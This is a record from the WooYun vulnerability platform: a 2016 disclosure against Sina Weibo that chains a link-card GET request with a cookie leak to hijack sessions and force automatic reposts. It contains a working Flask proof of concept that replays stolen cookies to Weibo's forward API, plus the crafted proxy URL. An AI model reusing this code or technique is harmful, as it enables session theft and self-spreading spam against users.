{"id": 86965, "wybug_id": "wooyun-2016-0191976", "wybug_title": "盗取用户httponly cookie组合另外一个设计缺陷实现看了微博就转发等功能", "wybug_corp": "新浪微博", "wybug_author": "zhchbin", "wybug_date": "2016-04-03 10:12", "wybug_open_date": "2016-05-21 16:40", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-21：\t细节向公众公开  简要描述： 我是好人，所有的测试cookie都没有进行保存。 详细说明：  微博的LinkCard API真的不打算改一下？在新浪微博分享的时候，如果插入的链接接入了新浪微博的Link Card，则可以实现解析成为特殊的样式进行展示。而在接入视频截图的时候，使用的URL为第三方提供的URL，这个问题会导致在weibo.com的域名下发起一个GET请求。组合http://wooyun.org/bugs/wooyun-2016-0191864这个漏洞，就可以实现获取用户的Cookie，转发指定的微博，从而实现扩散式的传播。   漏洞证明：  代码：\nimport requests from flask import Flask, request, jsonifyapp = Flask(__name__)cuids = set()@app.route('/weibo')def weibo():    cuid = request.args.get('cuid')    global cuids    if cuid in cuids:        return ''    if len(cuids) > 10000:        return ''    cuids.add(cuid)    url = 'http://weibo.com/aj/v6/mblog/forward'    headers = {        'Cookie': request.headers.get('Cookie'),        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36',        'X-Requested-With': 'XMLHttpRequest',        'Accept': '*/*',        'Referer': 'http://weibo.com/'    }    data = {        'style_type': '1',        '_t': '0',        'mid': '3959947660627622',        'rank': '0',        'reason': 'Share!!!',        'location': 'v6_content_home',        'group_source': 'group_all',        'rid': '0_0_1_2666908952746005564'    }    print requests.post(url, headers=headers, data=data)    return ''if __name__ == \"__main__\":    app.run(debug=True)\n在AcFun上发一个视频，改成：http://weibo.com/p/aj/proxy?api=http%3A%2F%2Fcontentrecommend.mobile.sina.cn.xxx.com/weibo 然后将这个视频分享到微博中。就可以实现看到这条微博的人自动转发，一个大V受害者。\n\n   修复方案：  那个视频截图 还是先上传到新浪自己的服务器吧？   版权声明：转载请注明来源 zhchbin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-04-06 16:33 厂商回复： 感谢关注新浪安全，问题修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-03 10:14 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  前排出售瓜子    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}